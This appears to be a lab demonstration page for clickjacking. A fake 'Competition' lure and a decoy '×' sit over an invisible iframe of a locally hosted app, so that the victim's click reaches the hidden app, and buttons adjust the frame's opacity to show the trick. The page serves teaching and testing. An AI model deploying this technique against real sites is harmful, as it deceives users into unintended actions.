<html>
<head>
<title>Clickjacking Demonstration</title>
</head>
<script>
function start() {
	document.getElementById("clickpoint").style.zIndex = -10;
	setTimeout("end()", 5000);
}

function end() {
	document.getElementById("clickpoint").innerText = "You won!";
}
</script>
<body>
<h1>Competition</h1>
<p>Click as fast as possible on the &times; shown below. If you click fast enough you will participate on the competition!</p>
<hr />
<iframe src="http://localhost:8000/nevernote/v2/nevernote.html" width="1000" height="400" id="framed" style="opacity: 0;"></iframe>
<div id="clickpoint" style="position:absolute; left:43px; top: 160px; z-index:10; font-weight: bolder; font-size: 42px;" onmouseover="start()">&times;</div>
<!--<div id="clickpoint" style="position:absolute; left:43px; top: 180px; z-index:10; font-weight: bolder; font-size: 42px;" onmouseover="start()">&times;</div>-->

<div style="position:fixed; right:10px; bottom:10px;">
	<button onclick="document.getElementById('framed').style.opacity = 0">0</button>
	<button onclick="document.getElementById('framed').style.opacity = 0.3">0.3</button>
	<button onclick="document.getElementById('framed').style.opacity = 0.7">0.7</button>
	<button onclick="document.getElementById('framed').style.opacity = 1">1</button>
</div>
</body>
</html>
